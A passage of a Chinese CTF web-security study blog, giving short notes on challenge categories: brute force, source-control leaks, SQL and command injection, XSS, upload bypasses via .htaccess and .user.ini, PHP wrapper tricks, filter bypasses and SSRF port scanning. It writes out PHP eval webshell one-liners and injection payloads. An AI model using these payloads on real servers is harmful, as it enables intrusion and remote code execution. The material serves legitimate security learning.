

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
  <title>ctf-web - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>wo02ie</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/wo02ie/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="ctf-web">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-11-24 18:52" pubdate>
        November 24, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      10k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      133
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ctf-web</h1>
            
            <div class="markdown-body">
              <h2 id="基础认证题"><a href="#基础认证题" class="headerlink" title="基础认证题"></a>基础认证题</h2><p><img src="https://img-blog.csdnimg.cn/20201123215812631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload alt="抓包如图"><br>页面中依据提示 可猜测用户为admin<br>可弱口令尝试（admin）——失败<br>暴脾气，，，词典爆破！<br>下载其页面提供的词典<br>抓包处对上图circle处进行解密 在burp的decode模板中进行查询可知其加密方式为base64<br>载入词典<br>此处开始走弯路：1.词典所加载的均为密码，缺少用户名（发现问题后，度娘学习正则表达式，很好，又学了个奇奇怪怪的姿势）2.词典爆破后一直都是401返回，长度均为404，没有出现200返回（原因未明）<br>——————————————我是分割线———————————<br>折腾一段时间后（替换爆破点，加载词典，设置解密方式），成功爆破出长度为200</p>
<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>要用到工具Githack,虚拟机一找，没有，网上查找Githack安装，？？？没有输入法吗，掉进一个大坑……配置源，使用sudo，dpkg命令……暂时做不下去了<br><img src="https://img-blog.csdnimg.cn/20201124083620314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload alt="..."></p>
<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>搜素引擎爬取各个网站时，网站告知搜索引擎的爬取范围（设置爬取权限）,robots.txt就作为搜素引擎爬取网站时第一个需要查看的文件</p>
<h2 id="灰色按钮（disabled-button）"><a href="#灰色按钮（disabled-button）" class="headerlink" title="灰色按钮（disabled button）"></a>灰色按钮（disabled button）</h2><p>利用开发者工具查看源代码，直接修改按钮对应的代码处（删除或注释掉带有禁用按钮的代码）涉及到html和php的学习</p>
<h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。</p>
<h2 id="HTTP中的GET和POST传参"><a href="#HTTP中的GET和POST传参" class="headerlink" title="HTTP中的GET和POST传参"></a>HTTP中的GET和POST传参</h2><p>GET传参在URL地址栏直接后面跟 ==/? +参数名+=+数值==<br>如 /?a=1 传参a=1<br>POST传参不能直接在URL栏里输入，使用插件hackbar，可以进行post传参</p>
<hr>
<p>post传参有四种方式，基本样式如下：</p>
<p>POST <a target="_blank" rel="noopener" href="http://www.example.com/">http://www.example.com</a> HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded;charset=utf-8<br>title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3    </p>
<hr>
<h2 id="IP伪造-xff和referer"><a href="#IP伪造-xff和referer" class="headerlink" title="IP伪造-xff和referer"></a>IP伪造-xff和referer</h2><p>抓包后改包：<br>添加   X-Forwarded-For：ip    Referer：网站<br>ip和网站均是要伪造的对象</p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>使用蚁剑或post方式 使用shell=system(‘cat flag.txt’)</p>
<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>由于输入对管道符  | || &amp; &amp;&amp;过滤不严产生的漏洞<br>windows或linux下:<br>|格式|说明|<br>|-|-|<br>|command1 &amp;&amp; command2 |先执行command1，如果为真，再执行command2|<br>|command1| command2 |只执行command2|<br>|command1 &amp; command2 |先执行command2后执行command1|<br>|command1|| command2 |先执行command1，如果为假，再执行command2|</p>
<h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>Windows下githack下载不出现./../.git<br>只下载了50x和index （原因不明！）–补充：使用了旧版本的Githuack<br><img src="https://img-blog.csdnimg.cn/20210120134909178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">kali内利用githack 却未发现50x和index</p>
<hr>
<blockquote>
<p>git log #查看提交历史</p>
</blockquote>
<p><strong>方法一：</strong><br>在目标文件夹终端直接git show出答案</p>
<blockquote>
<p>git show：显示一个或多个对象(<code>blobs</code>，树，标签和提交)。对于提交，它还能<strong>显示日志消息和文本差异。</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210120134849174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>方法二：</strong><br>也可以使用git reset –hard “add flag的那个序列号”回退存有flag的版本</p>
<blockquote>
<p>git reset 序列号：回退版本</p>
</blockquote>
<p>此时文件夹内出现50x和index以及一个flag的txt<br><img src="https://img-blog.csdnimg.cn/20210121000823424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">dvcs-ripper 参数:</p>
<p> -c     perform ‘hg revert’ on end (default)<br> -b &lt;s&gt; Use branch &lt;s&gt; (default: )<br> -a &lt;s&gt; Use agent &lt;s&gt; (default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:10.0.2) Gecko/20100101 Firefox/10.0.2)<br> -s     do not verify SSL cert<br> -p &lt;h&gt; use proxy <h> for connections<br> -v     verbose (-vv will be more verbose)</p>
<h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p> <img src="https://img-blog.csdnimg.cn/20210311104348703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h2 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210311104126693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>原文件不存在，直接在url得到<img src="https://img-blog.csdnimg.cn/20210311104220836.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<hr>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>使用sqlmap<br>整数型以及字符型：<br><code>python3 sqlmap.py -u &quot;url&quot; --cookie=&quot;&quot; </code>（Ⅰ）<br>（Ⅰ）跟参数–current-db<br>（Ⅰ）跟参数-D 数据库名 –tables<br>（Ⅰ）跟参数-D 数据库名 -T 表名 –columns<br>（Ⅰ）跟参数-D 数据库名 -T 表名 (-Ｃ 列名) –dump</p>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><code>127.0.0.1&amp;ls</code><br>出来一个<code>*.php</code><br>此时拼接<code>cat *.php</code>无回显（<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8125">传送门</a>）<br>此处是字符编码的问题 后面跟<code>| base64</code>出现一堆字符后复制解码即可</p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>在xss平台上注册账号 建立一个项目（勾选默认配置即可）<br>复制xss代码<br><img src="https://img-blog.csdnimg.cn/20210218112452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"> 先在第一栏随便输入字符<br>然后复制url到第二栏 并且更改刚刚的字符 替换拼接为xss代码<br>发送至服务器即可<br><img src="https://img-blog.csdnimg.cn/20210218112842968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">在项目里边可以看到反弹回来的内容<br><img src="https://img-blog.csdnimg.cn/20210218112901552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vim是一种开源编辑器，由于在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容：<br>第一次产生的交换文件名为 <code>. .swp</code><br>再次意外退出后，将会产生名为<code>. .swo</code>的交换文件<br>第三次产生的交换文件则为<code> . .swn</code><br>此题使用终端命令<code>vim -r index.php.swp</code>恢复原文件即可</p>
<h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br>利用工具dsstore:<code>python3 main.py .DS_Store</code>导出一个文本文件</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/95987.html">文件上传常见姿势</a></p>
<h4 id="js前端验证"><a href="#js前端验证" class="headerlink" title="js前端验证"></a>js前端验证</h4><p>写一个一句话木马 查看源码可知只允许上传图片格式<br>更改文件后缀名 抓包后改回后缀 上传后连接蚁剑<br>也可以直接禁用js直接上传</p>
<p>DVWA中级文件上传则是通过Content-Type在服务端MIME检测</p>
<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>修改Content-Type为image/jpeg、image/png、image/gif</p>
<h4 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h4><p>百度百科：<img src="https://img-blog.csdnimg.cn/20210223002229696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>利用条件</p>
<ul>
<li><p><input checked="" disabled="" type="checkbox">  apache服务器</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  能够上传.htaccess文件，一般为黑名单限制。</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  AllowOverride All，默认配置为关闭None。</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  上传目录具有可执行权限LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态 </p>
</li>
</ul>
<p>写一个<code>.htaccess</code>文件：</p>
<ul>
<li>正则匹配名为test的文件 当作php文件解析 ：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span><br> <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>

<p>或：</p>
<ul>
<li>以php解析.htaccess文件所在目录及其子目录中的后缀为.xxx的文件文件</li>
</ul>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php xxx<br></code></pre></td></tr></table></figure>

<p>或</p>
<p>直接一句话以php解析.htaccess文件所在目录及其子目录中的所有文件 上传一个test.jpg的一句话木马，然后连接蚁剑即可</p>
<h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h4><p>上面的是对apache起作用的，而这个是对以fastcgi运行的php起作用的，不管他的服务器是nginx/apache/IIS，范围更广</p>
<p>php.ini是php的配置文件，通常下载下来的php都没有这个文件，有两个预置的ini模板，php.ini-development和php.ini-production,前者是开发环境推荐的，允许调试，少占资源；后者是上线产品时的环境推荐，禁止报错，提高性能</p>
<p>php.ini包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 ini 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 <code>.user.ini</code> 风格的 ini 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 ini 设置可被识别</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png" srcset="/img/loading.gif" lazyload alt="enter image description here"></p>
<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的</p>
<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载，然后我们看到php.ini中的配置项，但是只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”，其中有两个可以利用的配置点</p>
<p>auto_append_file和auto_prepend_file</p>
<p>前者是文件包含在要执行的文件后，后者是自动包含在要执行的文件前</p>
<p>在.user.ini写入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auto_prepend_file=xxx.jpg<span class="hljs-regexp">/png/gi</span>f<br></code></pre></td></tr></table></figure>

<p>然后上传一个一句话图片马</p>
<p>buu一道题为例 buu suctf CheckIn</p>
<p>上传.user.ini后上传一个图片 抓包改包</p>
<p>此题检测<code>&lt;?</code>需要对一句话进行变形具体见一句话的变形</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210606161438091.png" srcset="/img/loading.gif" lazyload alt="image-20210606161438091"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210606161521279.png" srcset="/img/loading.gif" lazyload alt="image-20210606161521279"></p>
<p><strong>00截断</strong><br>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。%00和0x00,后台读取是遇到%00就会停止。举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。<br>00截断的限制条件：PHP&lt;5.3.29，且GPC关闭<br>==注意：00截断是在url的地方实现的==</p>
<p><img src="https://img-blog.csdnimg.cn/2021022323070732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>传图片马 burp抓包 改post后面的url<br><img src="https://img-blog.csdnimg.cn/20210223232427937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>蚁剑连接时注意修改url</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><strong>php://input</strong><br>利用php伪协议 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">滚去看啦:PHP伪协议总结</a><br><img src="https://img-blog.csdnimg.cn/20210302113044978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在hackbar内写<code>/?php://input</code>后POST传参<code>&lt;?php system(&#39;&#39;);?&gt;</code>得到flag<br><strong>远程包含</strong><br>此题也可以利用伪协议解开 但此题考查的是个人vps的利用 待补<br><strong>读取源代码</strong><br>利用伪协议中的<code>php://filter</code><br>构造url<code>/?php://filter/read=convert.base64-encode/resource=/flag</code></p>
<p>关于php一句话：<br>如果在浏览器传参，使用””包裹php一句话，并且echo &gt;*.php的方式写入时时，则需要注意对$的转义，避免此类情况的发生，建议使用’’”包裹一句话</p>
<p>在windows下利用cmd的echo &gt;*.php 需要对尖括号进行转义（不必加引号包裹），即：<br><code>^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt;</code></p>
<p>在linux下echo &gt;*.php：<br><code>&quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot;</code><br><code>&quot;&lt;?php @eval(\$_POST[\&quot;pass\&quot;]);?&gt;&quot;</code><br><code>&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;</code><br><code>&#39;&lt;?php @eval($_POST[\&#39;pass\&#39;]);?&gt;&#39;</code></p>
<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p><code>$&#123;IFS&#125;</code><br><code>$IFS$9</code><br><code>&lt;</code><br><code>&lt;&gt;</code><br><code>&#123;,&#125;</code><br>等可以代替空格<br>此题注释掉了答案而不回显 空格绕过后查看页面源码即可</p>
<h2 id="综合绕过"><a href="#综合绕过" class="headerlink" title="综合绕过"></a>综合绕过</h2><p>利用编码表打出组合拳<br><img src="https://img-blog.csdnimg.cn/20210313110431187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>读取Web目录下的flag.php 考了个常识，web目录在：<code>var/www/html</code><br>直接用读取文件的伪协议:<code>file:///var/www/html</code></p>
<h2 id="在线扫描端口"><a href="#在线扫描端口" class="headerlink" title="在线扫描端口"></a>在线扫描端口</h2><p>这里熟悉一个协议：<br>dict协议(2628)：<a target="_blank" rel="noopener" href="http://www.dict.org是一个线上的字典查询网站(真就查单词的)/">www.dict.org是一个线上的字典查询网站(真就查单词的)</a> 能想到用这个协议来探测端口的也是人才<br>原理：（待补）<br>可以在命令行里连接玩一下 telnet ip 2628<br>help 查看帮助<br>define * (要查询的单词)<br><img src="https://img-blog.csdnimg.cn/20210313170807589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>好了 这是官方文档中dict://语法</p>
<p><img src="https://img-blog.csdnimg.cn/20210313170835224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>首先在地址栏构造<code>?url=dict://127.0.0.1:8000</code><br>由于dict://协议是一条一条执行的 需要让浏览器逐个访问8<del>9K的端口<br>从字典爆破的角度考虑，那么抓包，放到intruder，将端口标记，爆破模式选择number，设置8</del>9K的范围，爆破完毕，倒叙查看长度，payload为8057，回到浏览器访问该端口即可<br><img src="https://img-blog.csdnimg.cn/20210313171505715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210313171540971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210313171710798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">插一句，也可以直接访问127.0.0.1加端口再挂burp爆破</p>
<p><img src="https://img-blog.csdnimg.cn/20210314180743119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这里的题目开始难度跨越很厉害了 得去学习一些涉及到的协议了</p>
<p>首先，什么是<code>gopher协议</code><img src="https://img-blog.csdnimg.cn/20210320203305300.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<blockquote>
